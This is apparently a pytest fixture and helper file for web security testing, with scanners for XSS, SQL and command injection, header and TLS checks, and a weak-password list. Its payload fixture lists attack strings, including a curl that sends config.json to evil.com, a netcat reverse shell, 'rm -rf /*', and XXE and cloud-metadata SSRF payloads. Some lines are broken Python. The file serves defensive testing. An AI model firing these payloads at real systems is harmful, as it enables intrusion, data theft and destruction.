"""
安全测试配置文件
"""

import pytest
import asyncio
import aiohttp
import json
import hashlib
import hmac
import base64
from typing import Dict, Any, List, Tuple
from unittest.mock import Mock, AsyncMock
from dataclasses import dataclass
from cryptography.fernet import Fernet
import ssl


@dataclass
class SecurityVulnerability:
    """安全漏洞数据类"""
    type: str
    severity: str  # low, medium, high, critical
    description: str
    evidence: str
    recommendation: str
    cwe_id: str = None


@dataclass
class SecurityTestResult:
    """安全测试结果"""
    test_name: str
    passed: bool
    vulnerabilities: List[SecurityVulnerability]
    details: Dict[str, Any]


class SecurityTestRunner:
    """安全测试运行器"""

    def __init__(self):
        self.results = []

    def add_result(self, result: SecurityTestResult):
        """添加测试结果"""
        self.results.append(result)

    def get_summary(self) -> Dict[str, Any]:
        """获取测试摘要"""
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.passed)
        failed_tests = total_tests - passed_tests

        all_vulnerabilities = []
        severity_counts = {"low": 0, "medium": 0, "high": 0, "critical": 0}

        for result in self.results:
            all_vulnerabilities.extend(result.vulnerabilities)
            for vuln in result.vulnerabilities:
                severity_counts[vuln.severity] += 1

        return {
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": failed_tests,
            "pass_rate": passed_tests / total_tests if total_tests > 0 else 0,
            "total_vulnerabilities": len(all_vulnerabilities),
            "vulnerabilities_by_severity": severity_counts,
            "test_results": [
                {
                    "name": r.test_name,
                    "passed": r.passed,
                    "vulnerabilities": len(r.vulnerabilities)
                }
                for r in self.results
            ]
        }


@pytest.fixture
def security_test_runner():
    """安全测试运行器夹具"""
    runner = SecurityTestRunner()
    yield runner


@pytest.fixture
def malicious_payloads():
    """恶意载荷集合"""
    return {
        "xss": [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')>",
            ""><script>alert('XSS')</script>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E"
        ],
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES('hacker','pass'); --",
            "' OR 1=1 #",
            "'; EXEC xp_cmdshell('dir'); --",
            "' UNION SELECT @@version --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& curl http://evil.com/steal?data=$(cat config.json)",
            "`whoami`",
            "$(id)",
            "; rm -rf /*",
            "| nc -e /bin/sh evil.com 4444",
            "&& ping -c 10 127.0.0.1"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd"
        ],
        "ldap_injection": [
            "*)(uid=*",
            "*)(&",
            "*)(|(objectClass=*)",
            "*)(|(password=*))",
            "*)%00",
            "*)(|(cn=*",
            "*)(|(sn=*",
            "*)(|(mail=*"
        ],
        "nosql_injection": [
            {"$ne": ""},
            {"$gt": ""},
            {"$where": "return true"},
            {"$regex": ".*"},
            {"$in": [1, 2, 3]},
            {"$nin": []},
            {"$exists": true},
            {"$or": [{"a": 1}, {"b": 2}]}
        ],
        "xxe": [
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\">%remote;]><root/>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>"
        ],
        "ssrf": [
            "http://localhost:22",
            "http://127.0.0.1:8080",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "file:///etc/passwd",
            "ftp://evil.com:21",
            "gopher://evil.com:70/_GET%20/HTTP/1.1%0Host:%20evil.com%0%0A"
        ],
        "deserialization": [
            "O:8:\"stdClass\":0:{}",
            "a:1:{i:0;i:1;}",
            "rO0ABXNyABdqYXZhLnV0aWwuU3RhY2tPdmVyZmxvdwAAAAAAAAABAgAAeHI=",
            "ACED0005737200176a6176612e7574696c2e537461636b4f766572666c6f77",
            "CQAAABkABHRhYmxlSQABAAAEAAAAAAIAAAA="
        ]
    }


@pytest.fixture
def security_headers():
    """安全HTTP头"""
    return {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "Content-Security-Policy": "default-src 'self'",
        "Referrer-Policy": "strict-origin-when-cross-origin",
        "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
    }


@pytest.fixture
def weak_passwords():
    """弱密码列表"""
    return [
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "123123",
        "baseball",
        "abc123",
        "football",
        "monkey",
        "letmein",
        "696969",
        "shadow",
        "master",
        "666666",
        "qwertyuiop",
        "123321",
        "mustang",
        "1234567890",
        "michael",
        "654321",
        "pussy",
        "superman",
        "1qaz2wsx",
        "7777777",
        "fuckyou",
        "121212",
        "000000",
        "qazwsx",
        "123qwe",
        "killer",
        "trustno1",
        "jordan",
        "jennifer",
        "zxcvbnm",
        "asdfgh",
        "hunter",
        "buster",
        "soccer",
        "harley",
        "batman",
        "andrew",
        "tigger",
        "sunshine",
        "iloveyou"
    ]


class SecurityScanners:
    """安全扫描器集合"""

    @staticmethod
    async def scan_xss_vulnerability(
        session: aiohttp.ClientSession,
        url: str,
        payloads: List[str]
    ) -> List[SecurityVulnerability]:
        """扫描XSS漏洞"""
        vulnerabilities = []

        for payload in payloads:
            try:
                # 测试URL参数中的XSS
                test_url = f"{url}?input={payload}"
                async with session.get(test_url) as response:
                    text = await response.text()
                    if payload in text and "<script>" in text:
                        vulnerabilities.append(SecurityVulnerability(
                            type="Cross-Site Scripting (XSS)",
                            severity="high",
                            description=f"XSS vulnerability in URL parameter",
                            evidence=f"Payload: {payload}",
                            recommendation="Implement proper input sanitization and CSP headers",
                            cwe_id="CWE-79"
                        ))

                # 测试POST请求中的XSS
                data = {"input": payload}
                async with session.post(url, json=data) as response:
                    text = await response.text()
                    if payload in text and "<script>" in text:
                        vulnerabilities.append(SecurityVulnerability(
                            type="Cross-Site Scripting (XSS)",
                            severity="high",
                            description=f"XSS vulnerability in POST data",
                            evidence=f"Payload: {payload}",
                            recommendation="Implement proper input sanitization and output encoding",
                            cwe_id="CWE-79"
                        ))
            except Exception:
                continue

        return vulnerabilities

    @staticmethod
    async def scan_sql_injection(
        session: aiohttp.ClientSession,
        url: str,
        payloads: List[str]
    ) -> List[SecurityVulnerability]:
        """扫描SQL注入漏洞"""
        vulnerabilities = []

        # SQL注入错误标识
        sql_errors = [
            "mysql_fetch",
            "sql syntax",
            "ORA-",
            "Microsoft OLE DB Provider",
            "ODBC Microsoft Access",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "MySQLSyntaxErrorException",
            "PSQLException",
            "org.hibernate.exception"
        ]

        for payload in payloads:
            try:
                # 测试GET参数
                test_url = f"{url}?id={payload}"
                async with session.get(test_url) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in sql_errors):
                        vulnerabilities.append(SecurityVulnerability(
                            type="SQL Injection",
                            severity="critical",
                            description=f"SQL injection vulnerability detected",
                            evidence=f"Payload: {payload}",
                            recommendation="Use parameterized queries/prepared statements",
                            cwe_id="CWE-89"
                        ))

                # 测试POST数据
                data = {"id": payload, "username": payload}
                async with session.post(url, json=data) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in sql_errors):
                        vulnerabilities.append(SecurityVulnerability(
                            type="SQL Injection",
                            severity="critical",
                            description=f"SQL injection vulnerability in POST request",
                            evidence=f"Payload: {payload}",
                            recommendation="Implement proper input validation and use ORM",
                            cwe_id="CWE-89"
                        ))
            except Exception:
                continue

        return vulnerabilities

    @staticmethod
    async def scan_command_injection(
        session: aiohttp.ClientSession,
        url: str,
        payloads: List[str]
    ) -> List[SecurityVulnerability]:
        """扫描命令注入漏洞"""
        vulnerabilities = []

        for payload in payloads:
            try:
                # 测试命令注入
                test_url = f"{url}?file={payload}"
                async with session.get(test_url) as response:
                    # 检查响应中是否包含命令执行的迹象
                    text = await response.text()
                    if "root:" in text or "uid=" in text or "gid=" in text:
                        vulnerabilities.append(SecurityVulnerability(
                            type="Command Injection",
                            severity="critical",
                            description=f"Command injection vulnerability",
                            evidence=f"Payload: {payload}",
                            recommendation="Avoid executing shell commands with user input",
                            cwe_id="CWE-78"
                        ))
            except Exception:
                continue

        return vulnerabilities

    @staticmethod
    async def check_security_headers(
        session: aiohttp.ClientSession,
        url: str,
        required_headers: Dict[str, str]
    ) -> List[SecurityVulnerability]:
        """检查安全头"""
        vulnerabilities = []

        try:
            async with session.get(url) as response:
                headers = response.headers

                for header_name, expected_value in required_headers.items():
                    if header_name not in headers:
                        vulnerabilities.append(SecurityVulnerability(
                            type="Missing Security Header",
                            severity="medium",
                            description=f"Missing {header_name} header",
                            evidence=f"Header {header_name} not found in response",
                            recommendation=f"Add {header_name}: {expected_value} to response headers",
                            cwe_id="CWE-1004"
                        ))
        except Exception:
            pass

        return vulnerabilities

    @staticmethod
    async def check_tls_configuration(url: str) -> List[SecurityVulnerability]:
        """检查TLS配置"""
        vulnerabilities = []

        try:
            import ssl
            from urllib.parse import urlparse

            parsed = urlparse(url)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)

            if parsed.scheme == 'https':
                # 获取SSL证书信息
                context = ssl.create_default_context()

                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()

                        # 检查证书有效期
                        import datetime
                        expiry_date = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if expiry_date < datetime.datetime.now() + datetime.timedelta(days=30):
                            vulnerabilities.append(SecurityVulnerability(
                                type="SSL Certificate Expiry",
                                severity="high",
                                description="SSL certificate will expire soon",
                                evidence=f"Certificate expires: {cert['notAfter']}",
                                recommendation="Renew SSL certificate before expiry",
                                cwe_id="CWE-295"
                            ))

                        # 检查弱密码套件
                        cipher = ssock.cipher()
                        if cipher and cipher[0].startswith("RC4") or "DES" in cipher[0]:
                            vulnerabilities.append(SecurityVulnerability(
                                type="Weak Cipher Suite",
                                severity="medium",
                                description=f"Weak cipher suite in use: {cipher[0]}",
                                evidence=f"Cipher: {cipher[0]}",
                                recommendation="Disable weak cipher suites and use strong TLS configurations",
                                cwe_id="CWE-327"
                            ))
        except Exception:
            pass

        return vulnerabilities


class AuthSecurityTester:
    """认证安全测试器"""

    @staticmethod
    def test_weak_passwords(password: str, weak_passwords: List[str]) -> bool:
        """测试弱密码"""
        return password.lower() in [p.lower() for p in weak_passwords]

    @staticmethod
    def test_password_strength(password: str) -> Dict[str, Any]:
        """测试密码强度"""
        strength = {
            "length": len(password) >= 8,
            "uppercase": any(c.isupper() for c in password),
            "lowercase": any(c.islower() for c in password),
            "numbers": any(c.isdigit() for c in password),
            "special": any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password),
            "score": 0
        }

        strength["score"] = sum(strength.values()) - 1  # 减去score自身

        if strength["score"] >= 5:
            strength["level"] = "strong"
        elif strength["score"] >= 3:
            strength["level"] = "medium"
        else:
            strength["level"] = "weak"

        return strength

    @staticmethod
    def generate_session_token() -> str:
        """生成安全的会话令牌"""
        import secrets
        return secrets.token_urlsafe(32)

    @staticmethod
    def hash_password(password: str, salt: str = None) -> Tuple[str, str]:
        """安全的密码哈希"""
        import hashlib
        import os

        if salt is None:
            salt = os.urandom(32).hex()

        # 使用PBKDF2进行密码哈希
        password_hash = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt.encode('utf-8'),
            100000  # 迭代次数
        )

        return password_hash.hex(), salt


@pytest.fixture
def security_scanners():
    """安全扫描器夹具"""
    return SecurityScanners


@pytest.fixture
def auth_security_tester():
    """认证安全测试器夹具"""
    return AuthSecurityTester


@pytest.fixture
def encryption_key():
    """加密密钥夹具"""
    return Fernet.generate_key()


class MockSSLServer:
    """模拟SSL服务器用于测试"""

    def __init__(self):
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # 使用自签名证书进行测试
        self.context.load_cert_chain(
            "test_server.crt",
            "test_server.key"
        )

    async def start(self, host: str = "localhost", port: int = 8443):
        """启动模拟SSL服务器"""
        server = await asyncio.start_server(
            self.handle_client,
            host,
            port,
            ssl=self.context
        )
        return server

    async def handle_client(self, reader, writer):
        """处理客户端连接"""
        request = await reader.read(1024)
        response = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
        writer.write(response)
        await writer.drain()
        writer.close()


@pytest.fixture
def mock_ssl_server():
    """模拟SSL服务器夹具"""
    return MockSSLServer()